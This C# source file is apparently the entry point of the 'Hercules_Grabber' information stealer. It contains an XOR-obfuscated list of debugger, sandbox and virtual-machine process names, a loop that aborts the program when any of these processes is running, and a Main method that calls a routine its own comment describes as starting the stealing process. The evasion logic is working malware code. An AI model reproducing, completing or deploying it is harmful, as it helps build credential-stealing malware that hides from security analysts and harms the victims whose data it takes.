
/*
  Made by Spuqe
  https://github.com/spuqe
 */

using System;
using System.Text;
using System.Threading;
using System.Diagnostics;

namespace Hercules_Grabber
{

    class ProgramStarter
    {
        // xor
        static string xor(string text, int n = 256)
        {
            byte[] input = Encoding.UTF8.GetBytes(text);
            byte[] output = new byte[input.Length];
            int i = 0;
            foreach (byte b in input)
            {
                output[i] = (byte)(b ^ n);
                i++;
            }
            return Encoding.UTF8.GetString(output);
        }

        public static bool Starter()
        {
            string[] list = new string[] {
            "QOTCUNGTM",
            "OBGW",
            "IJJ_BDA",
            "RGUMKAT",
            "VTIECUUNGEMCT",
            "VTIEC^V",
            "BHUV_",
            "OBGW",
            "OKKSHOR_BCDSAACT",
            "QOTCUNGTM",
            "BSKVEGV",
            "NIIMC^VJITCT",
            "OKVITRTCE",
            "VCRIIJU",
            "JITBVC",
            "U_UOHUVCERIT",
            "VTIEyGHGJ_\\CT",
            "U_UGHGJ_\\CT",
            "UHO@@yNOR",
            "QOHBDA",
            "LICDI^EIHRTIJ",
            "@OBBJCT",
            "LICDI^UCTPCT",
            "OBG",
            "OBG",
            "PKRIIJUB",
            "PKQGTCRTGR",
            "PKQGTCSUCT",
            "PKGERNJV",
            "PDI^UCTPOEC",
            "PDI^RTG_",
            "MUBSKVCT",
            "TCEJGUHCR",
            "^BDA",
            "IJJ_BDA",
            "VTIATCUURCJCTOM@OBBJCTQCDBCDSAACT",
            "^BDA",
            "MUBSKVCT",
            "NRRVBCDSAACT"

        };

            foreach (Process p in Process.GetProcesses())
            {
                foreach (string name in list)
                {
                    if (xor(p.ProcessName.ToLower(), 38).Contains(name))
                    {
                        return true;
                    }
                }
            }

            return false;

        }

        static class Start
        {

            static void Runner()
            {
                while (true)
                {
                    if (ProgramStarter.Starter()) { Environment.FailFast(null); }

                    Thread.Sleep(100);
                }
            }


            static void Main()
            {

                //start
                Stealer.StartSteal(); // Starts stealing process at Stealer.cs on function StartSteal()
                Console.WriteLine("a");
            }
        }
    }
}